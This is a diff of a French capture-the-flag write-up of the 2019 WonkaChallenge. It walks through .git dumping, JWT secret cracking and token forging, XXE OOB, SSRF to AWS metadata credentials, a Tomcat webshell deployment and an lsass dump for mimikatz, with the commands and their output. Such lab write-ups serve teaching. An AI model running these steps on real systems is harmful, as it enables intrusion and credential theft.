@@ -9,52 +9,52 @@ toc: true
 
 ## Introduction
 
-Le Wonka Challenge est une épreuve réalisé par [Akerva](https://akerva.com/), une société de cybersécurité française, contenant 13 flags. Ce challenge a été déployé à [LeHack](https://lehack.org/en) 2019, une conférence de cybersécurité française.
+Cette année, lors de LeHack 2019, nous avons assisté au lancement de la seconde édition du __WonkaChallenge__ réalisé par [Akerva](https://akerva.com/). Lors de la première édition, nous pouvions retrouver un certain nombre d'épreuves, commençant par des challenges web et en continuant sur de l'Active Directory. Les writeups officiels de l'édition de l'année dernière se trouvent ici :
 
-Dans ce challenge on va retrouver plusieurs parties :
+1. Williwonka.shop : https://akerva.com/blog/wonkachall-akerva-ndh-2018-write-up-part-1/
+2. Pramafil.com : https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-2/
+3. Compromission SI pramafil : https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-3/
+4. Compromission du domaine DEV : https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-4/
+5. Comme à la maison : https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-5/
 
-1. Web
-2. Active Directory
-3. Linux LAN
+Cette année, le WonkaChall est resté sur la même lancée en ajoutant une partie pwn et Linux à la fin. Cet article a pour but de décrire ma résolution des 13 épreuves de ce WonkaChall. Akerva a aussi écrit un writeup officiel :
 
-Ce challenge était vraiment intéressant, j'ai appris pas mal de trucs, notamment sur la partie Active Directory. C'est assez rare d'avoir un challenge avec du Windows à cause des licences. Le writeup sera plutôt long, donc je vais faire des TL;DR et les liens vers les différentes ressources utiles pour chaque sections.
+1. Part 1 - WEB : https://akerva.com/blog/wonkachall-akerva-lehack-2019-write-up-part-1-web/
+2. Part 2 - WINDOWS : https://akerva.com/blog/wonkachall-2-lehack-2019-write-up-part-2-windows/
 
-J'espère que vous allez autant avoir de fun à lire ce writeup que moi à faire le challenge!
+Cet article va se découper en 13 parties, une pour chaque flag à trouver. Mais avant d'attaquer le vif du sujet, ci-dessous un schéma du réseau complet (attention, petit spoil :)) : 
 
-Le point d'entré du challenge se trouve avec ce lien : https://willywonka.shop
+![](/img/writeups/wonkachall2019/network_diagram_vm_nat.png)
+
+En fait, certaines épreuves nécessitent du Windows et d'autre du Linux, donc je switch entre ma Commando (Windows) et ma Kali (Linux). Mon setup est plutôt simple, un hôte Windows 10 avec VMWare pro et les deux VM en NAT. Maintenant que tous les prérequis sont présentés, j'espère que la lecture sera agréable !
+
+Le point d'entrer du challenge se trouve avec ce lien : https://willywonka.shop
 
 ![](https://media.giphy.com/media/3o7TKUM3IgJBX2as9O/giphy.gif)
 
-## Step 1 - Developper's mistake
+## I. Step 1 - Erreur de developpeur
 
 > Let's start easy, what are the latest changes to the website ?
 
-![](https://media.giphy.com/media/ES9V2TWfWOcaQ/source.gif)
-
 ### TL;DR
 
-1. Faire un dirsearch et trouver un dossier `.git`
-2. Utiliser `GitTools -> dumper -> extractor` pour récupérer le git et les anciens commit
-3. Le premier flag se situe dans le fichier `.git/COMMIT_EDITMSG`
+1. Utiliser dirsearch et trouver le dossier `.git` ;
+2. Avec `GitTools -> dumper -> extractor`, récupérer le git et les anciens commits ;
+3. Le premier flag se situe dans le fichier `.git/COMMIT_EDITMSG`.
 
 ---
 
-### Directory listing
+### I.1. Directory listing
 
-![azazaza](/img/writeups/wonkachall2019/step1_index.png)
-_Fig 1_ : Index of the website
+![](/img/writeups/wonkachall2019/step1_index.png)
+_Fig 1_ : Index du site
 
-Première chose que je fais en arrivant sur un site, c'est de lancer un `dirsearch`. Le wordlist par défaut est vraiment pertinente, en général ce qu'elle sort se transforme en quick win et en plus il est plutôt rapide.
+Première chose que je fais en arrivant sur un site, c'est de lancer `dirsearch`. La wordlist par défaut est vraiment pertinente, en général ce qu'elle sort se transforme en quick win :
 
 ```bash
-➜  dirsearch git:(master) ./dirsearch.py -u https://willywonka.shop/ -e .html,.php,.txt           
-
- _|. _ _  _  _  _ _|_    v0.3.8
-(_||| _) (/_(_|| (_| )
+➜ ./dirsearch.py -u https://willywonka.shop/ -e .html,.php,.txt           
 
 Extensions: .html, .php, .txt | HTTP method: get | Threads: 10 | Wordlist size: 6878
-
-Error Log: /opt/t/dirsearch/logs/errors-19-07-21_01-29-23.log
 
 Target: https://willywonka.shop/
 
@@ -87,44 +87,31 @@ Target: https://willywonka.shop/
 [01:29:38] 200 -    4KB - /register
 [01:29:38] 200 -    4KB - /reset
 [01:29:39] 302 -  265B  - /submit  ->  http://willywonka.shop/profile?filetype=image%2Fpng
-
-Task Completed
 ```
 
-On voit donc un fichier `.git`, avec `GitTools` il est possible de dump le commit présent.
+Un dossier `.git` a donc été trouvé. Même si ce genre de dossier affiche un beau "403 Forbidden", les fichiers sont souvent accessible : 
 
-### Git dumping
+![](/img/writeups/wonkachall2019/step1_git.png)
+_Fig 2_ : Dossier git accessible
+
+Il est donc possible de récupérer le contenu des anciens commits grâce à `GitTools`.
+
+### I.2. Git dumping
 
 Pour récupérer l'intégralité du `git`, on va d'abord utiliser le script `gitdumper.sh` puis le `extractor.sh` pour récupérer les différents commits.
 
 ```bash
-➜  wonkachall2019 git:(master) ✗ mkdir out_dump  
+➜ mkdir out_dump  
+➜ /opt/t/pentest/exploit/GitTools/Dumper/gitdumper.sh https://willywonka.shop/.git/ out_dump
 
-➜  wonkachall2019 git:(master) ✗ /opt/t/pentest/exploit/GitTools/Dumper/gitdumper.sh https://willywonka.shop/.git/ out_dump
-###########
-# GitDumper is part of https://github.com/internetwache/GitTools
-#
-# Developed and maintained by @gehaxelt from @internetwache
-#
-# Use at your own risk. Usage might be illegal in certain circumstances. 
-# Only for educational purposes!
-###########
 [*] Destination folder does not exist
 [+] Creating a/.git/
 [+] Downloaded: HEAD
 [...]
 
-➜  wonkachall2019 git:(master) ✗ mkdir out_extract
+➜ mkdir out_extract
+➜ /opt/t/pentest/exploit/GitTools/Extractor/extractor.sh out_dump out_extract                         
 
-➜  wonkachall2019 git:(master) ✗ /opt/t/pentest/exploit/GitTools/Extractor/extractor.sh out_dump out_extract                         
-###########
-# Extractor is part of https://github.com/internetwache/GitTools
-#
-# Developed and maintained by @gehaxelt from @internetwache
-#
-# Use at your own risk. Usage might be illegal in certain circumstances. 
-# Only for educational purposes!
-###########
 [+] Found commit: 8cda59381a6755d33425cb4ccddcc011a85649c6
 [+] Found file: /home/maki/Documents/wonkachall2019/b/0-8cda59381a6755d33425cb4ccddcc011a85649c6/.env
 [...]
@@ -133,20 +120,17 @@ Pour récupérer l'intégralité du `git`, on va d'abord utiliser le script `git
 [...]
 ```
 
-### Flag
+Il ne reste plus qu'à aller chercher le flag :
 
 ```bash
-➜  wonkachall2019 git:(master) ✗ ls
-  a    b    img    README.md    step1.md
-➜  wonkachall2019 git:(master) ✗ cd a/.git                    
-➜  .git git:(master) ls
-  COMMIT_EDITMSG    config    description    HEAD    index    info    logs    objects    refs
-➜  .git git:(master) cat COMMIT_EDITMSG 
+➜ cat out_dump/.git/COMMIT_EDITMSG 
 Added debug mode with "debug=1" GET param
 
 A wild flag appears !
 16ECD0DF90036C3CA8D6E988BB1737DC332CD72A8F4E62C32E0F825EDD155009
 ```
+
+### I.3. Flag
 
 > 16ECD0DF90036C3CA8D6E988BB1737DC332CD72A8F4E62C32E0F825EDD155009
 
@@ -157,28 +141,29 @@ A wild flag appears !
 1. __maurosoria__, _dirsearch_, GitHub : https://github.com/maurosoria/dirsearch 
 2. __internetwache__, _GitTools_, GitHub : https://github.com/internetwache/GitTools
 
-## Step 2 - A tale of JWT
+---
+---
+
+## II. Step 2 - A tale of JWT
 
 >  A ticket 'deadbeef' was submitted. Who's the victim ? 
 
-![](https://media.giphy.com/media/UtPXYALLCey0SKFd4r/giphy.gif)
-
 ### TL;DR
 
-1. Faire de l'audit de code grâce au `.git` trouvé dans l'étape d'avant, trouver le `debug=1` dans la config de Symphony
-2. Mettre la page `/reset` en debug nous permet de récupérer une stacktrace : `https://willywonka.shop/reset?debug=1`
-3. Dans la stacktrace on trouve un sous domaine (`backend.willywonka.shop`) et un JSON Web Token (JWT)
-4. Il existe une autre page `/reset` sur le backend. Grâce à cette page, on sait que le site attend un JWT dans le cookie `backend-session`
-5. Analyse du JWT récupéré dans la stacktrace et voir qu'il est protégé par une clé secrète (HS256)
-6. Le bruteforcer avec `rockyou` et trouver la clé `s3cr3t` 
-7. Forger un nouveau token avec un utilisateur valide (`aas`) et une expiration lointaine, ça donne la requête :`https://backend.willywonka.shop/reset/jwt_craft ` . La liste des comptes se trouve sur la page d'accueil du frontend.
-8. Une fois la mire d'authentification terminé, chercher le ticket `deadbeef`
+1. Faire de l'audit de code grâce au `.git` trouvé dans l'étape d'avant, trouver le `debug=1` dans la configuration de Symphony ;
+2. Mettre la page `/reset` en debug afin de récupérer une stacktrace : `https://willywonka.shop/reset?debug=1` ;
+3. Dans la stacktrace on trouve un sous domaine (`backend.willywonka.shop`) et un JSON Web Token (JWT) ;
+4. Il existe une autre page `/reset` sur le backend. Grâce à cette page, on sait que le site attend un JWT dans le cookie `backend-session` ;
+5. L'analyse du JWT récupéré dans la stacktrace montre qu'il est protégé par une clé secrète (HS256) ;
+6. Le bruteforcer avec `rockyou` et trouver la clé `s3cr3t` ; 
+7. Forger un nouveau token avec un utilisateur valide (`aas`) et une expiration lointaine, donnant la requête :`https://backend.willywonka.shop/reset/jwt_craft `. La liste des comptes se trouve sur la page d'accueil du frontend ;
+8. Une fois la mire d'authentification passée, il ne reste qu'à chercher le ticket `deadbeef`.
 
 ---
 
-### Directory listing
+### II.1. Directory listing
 
-Dans le `dirsearch` fait précédemment, si on enlève le `.git` il reste :
+En enlevant les fichiers liés au `.git` du `dirsearch` précédent, il reste les pages suivantes :
 
 ```bash
 [11:10:46] 200 -    5KB - /login
@@ -189,22 +174,22 @@ Dans le `dirsearch` fait précédemment, si on enlève le `.git` il reste :
 [11:10:55] 302 -  265B  - /submit  ->  http://willywonka.shop/profile?filetype=image%2Fpng
 ```
 
-### User enumeration
+### II.2. Enumération d'utilisateur
 
-En utilisant l'application, j'ai remarqué qu'il était possible de faire de l'énumération d'utilisateur :
+Lors de l'utilisation de l'application, on se rend compte qu'il est possible de faire de l'énumération d'utilisateur :
 
 ![](/img/writeups/wonkachall2019/step2_unable_to_find_user.png)
-_Fig 2_ : Unable to find user
+_Fig 3_ : Impossible de trouver l'utilisateur
 
-Pour tester la théorie de l'énumération d'utilisateurs, j'ai pris la wordlist des usernames de seclist et passé dans intruder (vu la taille de la wordlist, la version gratuite de burp est largement suffisante).
+Pour tester cette théorie, j'ai utilisé la wordlist des usernames de seclist. Cette wordlist est plutôt courte, donc rapide. L'intruder de la version gratuite de burp fait l'affaire pour ce test :
 
 ![](/img/writeups/wonkachall2019/step2_intruder.png)
-_Fig 3_ : User enumeration
+_Fig 4_ : Enumération d'utilisateur 1/2
 
-Donc si un utilisateur est valide, le serveur renvoi une erreur 500... A savoir aussi que ce bruteforce d'utilisateur ne sert __à rien__ et m'a même fait perdre du temps par la suite. La liste des utilisateurs peut être trouvée sur l'index du site :
+Si un utilisateur valide est soumit à l'application, alors cette application renvoit... Une erreur 500. A savoir aussi que ce bruteforce d'utilisateur ne sert __à rien__ et m'a même fait perdre du temps par la suite. La liste des utilisateurs peut être trouvée sur l'index du site :
 
 ![](/img/writeups/wonkachall2019/step2_users_list_index.png)
-_Fig 4_ : User enumeration
+_Fig 5_ : Enumération d'utilisateur 2/2
 
 Les utilisateurs sont donc :
 
@@ -216,12 +201,12 @@ Les utilisateurs sont donc :
 * aas
 * xXx_d4rkR0xx0r_xXx
 
-### Don't forget the git
+### II.3. Ne pas oublier le .git
 
-Maintenant qu'on a récupéré des utilisateurs, mais vu que le serveur renvoi unr erreur 500, on est pas beaucoup plus avancé. Il ne faut donc pas oublier de fouiller le git. On trouve une variable get `/?debug=1`
+En regardant de plus près les sources obtenues dans le `.git` de l'étape 1, on remarque qu'il y a une histoire de debug. Une variable `/?debug=1` :
 
 ```bash
-➜  out_extract cat 0-7a1756aae221342ab09f9101358201bbfa70a702/config/routes.yaml 
+➜ cat 0-7a1756aae221342ab09f9101358201bbfa70a702/config/routes.yaml 
 #index:
 #    path: /
 #    controller: App\Controller\DefaultController::index
@@ -230,10 +215,10 @@ debug:
     controller: #TODO#
 ```
 
-J'ai perdu pas mal de temps à comprendre pourquoi ça ne fonctionnait pas sur la route principale. Au final, j'ai mis l'utilisateur valide `aas` dans le formulaire de reset et ajouté le paramètre avant l'envoi du formulaire. Le retour est très intéressant, car on peut voir le stacktrace de l'application :
+N'étant pas familier avec Symphony, j'ai perdu du temps à comprendre pourquoi cette variable ne fonctionnait pas sur la route principale. Finalement, placer un utilisateur valide (tel que `aas`) dans le formulaire de reset et ajouter le paramètre GET renvoit la stacktrace de l'application :
 
 ![](/img/writeups/wonkachall2019/step2_stacktrace.png)
-_Fig 5_ : Stacktrace de l'application
+_Fig 6_ : Stacktrace de l'application
 
 > https://willywonka.shop/reset?debug=1
 
@@ -305,7 +290,7 @@ https://stackoverflow.com
 https://lmgtfy.com
 ```
 
-Les informations intéressantes ici sont donc :
+Cette trace divulgue des informations sensibles quant au SI de la cible :
 
 ```
 * backend.willywonka.shop
@@ -313,19 +298,12 @@ Les informations intéressantes ici sont donc :
 * eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0IiwiYXVkIjoiZnJvbnRlbmQud2lsbHl3b25rYS5zaG9wIiwiaWF0IjoxNTYyNjY0MzE1LCJleHAiOjE1NjI2NjQ5MTV9.UW7ZBlYilpv6g5oI-ryrnq1l00kfurcTbaG2FtSEU-o
 ```
 
-### Dirsearch on backend
+### II.4. Enumération web sur le backend
 
-Nouvel hote ou nouveau site web dans le test d'intrusion, signifie qu'on reprend la recon depuis le départ :
+Nouveau site web, nouveau dirsearch. Celui-ci renvoit énormément de `403`. Après un filtrage de qualité, le scan donne des résultats pertinents :
 
 ```bash
-➜  wonkachall2019 git:(master) ✗ python3 /opt/t/pentest/recona/dirsearch/dirsearch.py -u https://backend.willywonka.shop -e do,java,action,db,sql,~,xml,pdf,jsp,php,old,bak,zip,tar,asp,aspx,txt,html,xsl,xslx -t 25 | grep -v 403
-
- _|. _ _  _  _  _ _|_    v0.3.8
-(_||| _) (/_(_|| (_| )
-
-Extensions: do, java, action, db, sql, ~, xml, pdf, jsp, php, old, bak, zip, tar, asp, aspx, txt, html, xsl, xslx | HTTP method: get | Threads: 25 | Wordlist size: 13259
-
-Error Log: /opt/t/pentest/recona/dirsearch/logs/errors-19-07-09_11-44-07.log
+➜  wonkachall2019 git:(master) ✗ python3 /opt/t/pentest/recona/dirsearch/dirsearch.py -u https://backend.willywonka.shop -e .php,.html,.txt,.pdf,.zip -t 25 | grep -v 403
 
 Target: https://backend.willywonka.shop
 
@@ -336,10 +314,10 @@ Target: https://backend.willywonka.shop
 [11:44:37] 302 -  219B  - /reset  ->  http://backend.willywonka.shop/login
 ```
 
-Le `grep -v 403` c'était pour virer les 403, il y en avait trop. Donc dans le dirsearch, les résultats sont relativement équivalents au frontend, sauf que tout est redirigé vers une page de `/login`. Le truc intéressant c'est qu'on voit que l'application attend un JSON Web Token :
+Les résultats sont relativement équivalents aux résultats du frontend. Cependant, toutes les pages du backend sont redirigé vers une page de `/login`. Cette page attend un JSON Web Token (JWT) :
 
 ![](/img/writeups/wonkachall2019/step2_backend_jwt.png)
-_Fig 6_ : backend-session cookie
+_Fig 7_ : Cookie backend-session 
 
 Le token contient : 
 
@@ -360,11 +338,9 @@ Le token contient :
 {}
 ```
 
-### Cracking the JWT secret
+### II.5. Craquer le secret du JWT
 
-Donc on a l'application frontend qui nous délivre un JWT et le backend qui en attend un. Il y a quelque chose à jouer !
-
-Le token de l'utilisateur `aas` quand je veux reset en debug :
+En rassemblant les différents éléments du test d'intrusion, on remarque rapidement que la stacktrace du frontend délivre un JWT et que le cookie du backend en attend un. L'hypothèse la plus plausible est de récupérer le secret, modifier le JWT et signer le nouveau JWT. Ci-dessous le token de l'utilisateur `aas` :
 
 ```
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhYXMiLCJhdWQiOiJiYWNrZW5kLndpbGx5d29ua2Euc2hvcCIsImlhdCI6MTU2MjY2NDMxNSwiZXhwIjoxNTYyNjk0MzE1fQ.6yuVpu_jugKOZL9p9-M-wAF6knpArUJqnfgQzS4W9N4
@@ -383,20 +359,10 @@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhYXMiLCJhdWQiOiJiYWNrZW5kLndpbGx
 }
 ```
 
-Le but ici va être de changer la partie `aud` pour faire un token pour le backend et le `exp` pour ne pas être dérangé par l'expiration du token. Pour modifier un JWT en `HS256`, il faut d'abord récupérer la clé secrète pour signer le token. On va donc le bruteforce :
+Afin de faire un nouveau jeton fonctionnel, il faut modifier les éléments suivants : `aud` et `exp`. Le premier élément permet de sélectionner le bon domaine. Le second, correspond à l'expiration du token, une date suffisamment éloignée garantit la tranquilité. Modifier un JWT `HS256` est relativement simple. Il existe un certain nombre d'outils efficace, comme `jwt_tool`. En plaçant une wordlist pertinente en paramètre, cet outil peut bruteforce le secret du token :
 
 ```bash
-➜  jwt_tool git:(master) python ./jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0IiwiYXVkIjoiZnJvbnRlbmQud2lsbHl3b25rYS5zaG9wIiwiaWF0IjoxNTYyNjY0MzE1LCJleHAiOjE1NjI2NjQ5MTV9.UW7ZBlYilpv6g5oI-ryrnq1l00kfurcTbaG2FtSEU-o /opt/t/bf/rockyou.txt 
-
-,----.,----.,----.,----.,----.,----.,----.,----.,----.,----.
-----''----''----''----''----''----''----''----''----''----'
-     ,--.,--.   ,--.,--------.,--------.             ,--.
-     |  ||  |   |  |'--.  .--''--.  .--',---.  ,---. |  |
-,--. |  ||  |.'.|  |   |  |      |  |  | .-. || .-. ||  |
-|  '-'  /|   ,'.   |   |  |,----.|  |  ' '-' '' '-' '|  |
- `-----' '--'   '--'   `--''----'`--'   `---'  `---' `--'
-,----.,----.,----.,----.,----.,----.,----.,----.,----.,----.
-'----''----''----''----''----''----''----''----''----''----'
+➜ python ./jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0IiwiYXVkIjoiZnJvbnRlbmQud2lsbHl3b25rYS5zaG9wIiwiaWF0IjoxNTYyNjY0MzE1LCJleHAiOjE1NjI2NjQ5MTV9.UW7ZBlYilpv6g5oI-ryrnq1l00kfurcTbaG2FtSEU-o /opt/t/bf/rockyou.txt 
 
 Token header values:
 [+] typ = JWT
@@ -428,26 +394,26 @@ Testing 14344380 passwords...
 [+] s3cr3t is the CORRECT key!
 ```
 
-Le nouveau token va avoir les options suivantes :
+Le secret a été cassé avec succès, il est possible de signer le nouveau jeton avec les paramètres suivants :
 
 * aud : backend.willywonka.shop
-* exp : 1999999999 -> On est tranquille jusqu'en 2033
+* exp : 1999999999 -> Une date aux alentours de 2033
 
 ![](/img/writeups/wonkachall2019/step2_jwtcrafted.png)
-_Fig 7_ : New token
+_Fig 8_ : Nouveau jeton
 
-Avec ce nouveau token, on accède au backend de l'application :
+Avec ce nouveau JWT, il est possible de passer outre l'authentification et ainsi accèder au backend de l'application :
 
 ```
 https://backend.willywonka.shop/reset/eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhYXMiLCJhdWQiOiJiYWNrZW5kLndpbGx5d29ua2Euc2hvcCIsImlhdCI6MTU2MjY2OTkxMiwiZXhwIjoxOTk5OTk5OTk5fQ.pZxLNOIrI1DCRdB-MBWDNtDnmeKeANTNm5btAoY6Pmw
 ```
 
-Il ne nous reste plus qu'à récupérer le ticket `deadbeef` pour récupérer le second flag.
+Conformément à l'énoncé, le flag se situe dans les données du ticket `deadbeef` :
 
 ![](/img/writeups/wonkachall2019/step2_auth_bypassed.png)
-_Fig 8_ : Second step flag
+_Fig 9_ : Second flag
 
-### Flag
+### II.6. Flag
 
 > 7ED33F3EB8E49C5E4BE6B8E2AE270E4018582B27E030D32DE4111DB585EE0318
 
@@ -459,7 +425,10 @@ _Fig 8_ : Second step flag
 1. __Auth0__, _JSON Web Token debugger_, jwt : https://jwt.io/
 2. __ticarpi__, _jwt\_tool_, GitHub : https://github.com/ticarpi/jwt_tool
 
-## Step 3 - Simple XXE OOB
+---
+---
+
+## III. Step 3 - Simple XXE OOB
 
 > There's a flag.txt at the server root 
 
@@ -475,7 +444,7 @@ _Fig 8_ : Second step flag
 
 ---
 
-### State of the art
+### III.1. State of the art
 
 Ayant découvert le hint directement, je savais que je cherchais une XXE via un SVG. Ici, il va falloir upload un SVG sur le frontend et y accéder via le backend avec l'id du ticket.
 
@@ -495,7 +464,7 @@ _Fig 10_ : XXE OOB in a nutshell
 
 J'ai déjà parlé de XXE OOB lors du [Santhacklaus](/walkthrough/santhacklaus2018/#archdrive-4-3), j'ai utilisé un serveur externe, mais il est possible de jouer avec deux ngrok.
 
-### Exploitation
+### III.2. Exploitation
 
 Si vous avez bien suivi l'explication précédente, on va générer plusieurs fichiers :
 
@@ -530,7 +499,7 @@ _Fig 12_ : Backend ticket
 
 Une vraie XXE OOB n'aurait pas de retour, m'enfin, on va pas se plaindre. On peut donc afficher le contenu des fichiers, tant qu'on connait le chemin et que notre utilisateur a les droits.
 
-### Flag
+### III.3. Flag
 
 > 0D7D2DDEA2B25FF0D35D3E173BA2CDCB120D3554E124EBE2B147B79CF0007630
 
@@ -541,11 +510,9 @@ Une vraie XXE OOB n'aurait pas de retour, m'enfin, on va pas se plaindre. On peu
 1. __alexbirsan__, _LFI and SSRF via XXE in emblem editor_, HackerOne : https://hackerone.com/reports/347139
 2. __Ian Muscat__, _Out-of-band XML External Entity (OOB-XXE)_, Acunetix : https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/
 
-## Step 4 - SSRF to KFC
+## IV. Step 4 - SSRF to KFC
 
 >  Lets check this bucket ! 
-
-![](https://media.giphy.com/media/in4t9IzuZKhqg/giphy.gif)
 
 ### TL;DR
 
@@ -558,7 +525,7 @@ Une vraie XXE OOB n'aurait pas de retour, m'enfin, on va pas se plaindre. On peu
 
 ---
 
-### State of the art
+### IV.1. State of the art
 
 D'après l'énoncé, il y a une histoire de bucket, ma première pensé a donc été bucket s3 de amazon. C'est la première fois que j'ai à jouer avec cette techno, j'avais lu pleins d'articles mais jamais expérimenté. C'est cool ! :D
 
@@ -602,7 +569,7 @@ grep -nRi "
 
 La première chose est d'utiliser la XXE pour taper sur l'IP d'Amazon et récupérer les informations du bucket, on a le lien dans le bash_history : `http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2toS3/`
 
-### Exploitation
+### IV.2. Exploitation
 
 Il suffit de modifier le `file:///flag.txt` de `ro.dtd` et ça nous donne :
 
@@ -656,7 +623,7 @@ output :
 
 Maintenant nous avons toutes les informations pour se connecter au bucket s3. Il ne nous reste plus qu'à initialiser les différentes variables d'environnement.
 
-### Connexion au bucket s3
+### IV.3. Connexion au bucket s3
 
 ```bash
 export AWS_ACCESS_KEY_ID=ASIAZ47IG35A57E4JGVL
@@ -668,7 +635,7 @@ export AWS_SESSION_TOKEN=AgoJb3JpZ2luX2VjEDkaCWV1LXdlc3QtMyJGMEQCIGmZTy1kpupPx9p
 2019-07-04 18:41:42 willywonka-shop
 ```
 
-### Get files
+### IV.4. Get files
 
 Il ne nous reste plus qu'à ce servir dans ce bucket :
 
@@ -708,7 +675,7 @@ On récupère un fichier vpn, enfin ! Mais on récupère aussi un schéma résea
 
 ![](/img/writeups/wonkachall2019/infra.png)
 
-### Flag
+### IV.5. Flag
 
 > 0AFBDBEA56D3B85BEBCA19D05088F53B61F372E2EBCDEFFCD34CECE8473DF528
 
@@ -719,11 +686,9 @@ On récupère un fichier vpn, enfin ! Mais on récupère aussi un schéma résea
 1. __@christophetd__, _Abusing the AWS metadata service using SSRF vulnerabilities_, Blog de Christophe Tafani-Dereeper : https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/
 2. __notsosecure team__, _Exploiting SSRF in AWS Elastic Beanstalk_, notsosecure : https://www.notsosecure.com/exploiting-ssrf-in-aws-elastic-beanstalk/
 
-## Step 5 - Tom and Jerry
+## V. Step 5 - Tom and Jerry
 
 >  Lets get the flag at the root of your first blood 
-
-![](https://media.giphy.com/media/s87EAEfMJDulq/giphy.gif)
 
 ### TL;DR
 
@@ -739,7 +704,7 @@ On récupère un fichier vpn, enfin ! Mais on récupère aussi un schéma résea
 
 ---
 
-### Network recon
+### V.1. Network recon
 
 Un fichier OpenVPN ! Enfin de l'interne ! Lorsque le tunnel VPN est monté, une nouvelle route apparait :
 
@@ -769,7 +734,7 @@ Je n'ai pas spécialement confiance au ping scan de nmap, car si l'icmp est bloq
 
 C'est le moment pour un port scan. J'ai tendance à d'abord faire un masscan (beaucoup plus rapide que nmap) suivi d'un nmap sur les ports ouverts pour avoir les infos des services exposés.
 
-#### 172.16.42.5
+#### V.1.a. 172.16.42.5
 
 ```bash
 sudo masscan -e tun0 -p0-65535,U:0-65535 --rate 1000 172.16.42.5 | tee out_mass_5
@@ -815,7 +780,7 @@ Host script results:
 |_  start_date: 1601-01-01 00:09:21
 ```
 
-#### 172.16.42.11
+#### V.1.b. 172.16.42.11
 
 
 ```bash
@@ -854,7 +819,7 @@ Host script results:
 |_  start_date: 1601-01-01 00:09:21
 ```
 
-#### 172.16.42.101
+#### V.1.c. 172.16.42.101
 
 ```bash
 sudo masscan -e tun0 -p0-65535,U:0-65535 --rate 1000 172.16.42.101
@@ -879,7 +844,7 @@ A vu de nez je dirais que la machine en .5 est un domain controller, donc on ver
 
 J'ai donc décidé de me tourner vers la machine .11, car il y a le port 8080 qui ressemble à un tomcat.
 
-### Basic enum on 172.16.42.11
+### V.2. Basic enum on 172.16.42.11
 
 J'ai fait un dirsearch avec une wordlist pour tomcat : https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/tomcat.txt
 
@@ -902,7 +867,7 @@ Mais il y a une autre page : `/host-manager`, une basic authent apparait et il s
 
 En cherchant un peu sur internet, je suis tombé sur un article de Certilience (cf. Ressource 1), il suffit de suivre.
 
-### Setup the attack
+### V.3. Setup the attack
 
 Il faut d'abord crafter le .war qui va nous permettre d'avoir un webshell. J'ai généré une archive war avec msfvenom puis modifié la charge pour avoir un webshell standard plutôt qu'un meterpreter. 
 
@@ -948,7 +913,7 @@ Ce webshell vient de : https://github.com/tennc/webshell
 
 Le .war peut être téléchargé ici : https://mega.nz/#!73RCVKDK!EPrPZ_JeWgZc2RWQq2OyErlJUGa-zAjf3fo8LbgtiCs
 
-#### New host 
+#### V.3.a. New host 
 
 Maintenant, il faut ajouter une entrée dans le `/etc/hosts` pour lier l'ip du web server à un hostname :
 
@@ -956,7 +921,7 @@ Maintenant, il faut ajouter une entrée dans le `/etc/hosts` pour lier l'ip du w
 sudo echo "172.16.42.11	maki-lab" >> /etc/hosts
 ```
 
-#### SMB server
+#### V.3.b. SMB server
 
 Enfin, mettre en place un serveur Samba, impacket fait largement l'affaire :
 
@@ -966,7 +931,7 @@ sudo smbserver.py -smb2support data .
 
 Le serveur samba se place dans le dossier courant, il faut pas non plus oublier de mettre notre archive war dans ce dossier pour la déployer.
 
-### Exploitation
+### V.4. Exploitation
 
 Aller, maintenant il est temps de déployer notre webshell
 
@@ -1005,7 +970,7 @@ Maintenant qu'on a un shell plus ou moins interactif et plus ou moins stable, il
 ![](/img/writeups/wonkachall2019/step5_flag.png)
 _Fig 18_ : Flag
 
-### Flag
+### V.5. Flag
 
 > 8F30C4422EB4E5D9A2BF7EE44D5098D68314C35BE58E9919417B45FCBEF205C8
 
@@ -1015,11 +980,9 @@ _Fig 18_ : Flag
 
 1. __Pôle audit de Certilience__, _Variante d’exploitation d’un Apache Tomcat : host manager app vulnérable ?_, Blog de Certilience : https://www.certilience.fr/2019/03/variante-d-exploitation-dun-tomcat-host-manager/
 
-## Step 6 - Mimikatz you said ?
+## VI. Step 6 - Mimikatz you said ?
 
 >  SHA256(adminServer's passwd) 
-
-![](https://media.giphy.com/media/r68EdGg3KOSpG/giphy.gif)
 
 ### TL;DR
 
@@ -1030,13 +993,13 @@ _Fig 18_ : Flag
 
 ---
 
-### State of the art
+### VI.1. State of the art
 
 Dans ce challenge, la première idée qui vient est d'utiliser mimikatz. Mais bon, ça aurait été trop simple.
 
 L'autre solution pour récupérer des creds dans lsass, est de créer un minidump et de l'analyser avec un mimikatz en local. De toute manière on va avoir besoin d'une machine Windows à un moment donné. Pour ma part, j'utilise Commando VM, c'est un script powershell fait par FireEye pour installer les outils classiques de pentest. Plutot pratique.
 
-### Getting lsass minidump
+### VI.2. Getting lsass minidump
 
 Comme je disais précédemment, on va utiliser procdump. C'est un binaire signé et trusté par Microsoft, car il fait parti des SysInternals. J'ai tendance à ne pas vouloir drop des binaires ou modifier la configuration d'une machine cible, donc je préfère l'éxecution en mémoire :
 
@@ -1058,7 +1021,7 @@ _Fig 20_ : Bring back the minidump at home
 
 Le minidump est disponible ici : https://mega.nz/#!bj4h1ISB!17pQuX17K8gvMRlBZYsuphDtHhYE07G1x-nyT1OPGVY
 
-### Getting password
+### VI.3. Getting password
 
 En executant mimikatz dans Commando VM :
 
@@ -1104,7 +1067,7 @@ J'ai tronqué un peu la sortie, sinon c'est chiant à lire. On a donc récupére
 
 Et maintenant il suffit d'en faire le sha256 pour avoir la flag.
 
-### Flag
+### VI.4. Flag
 
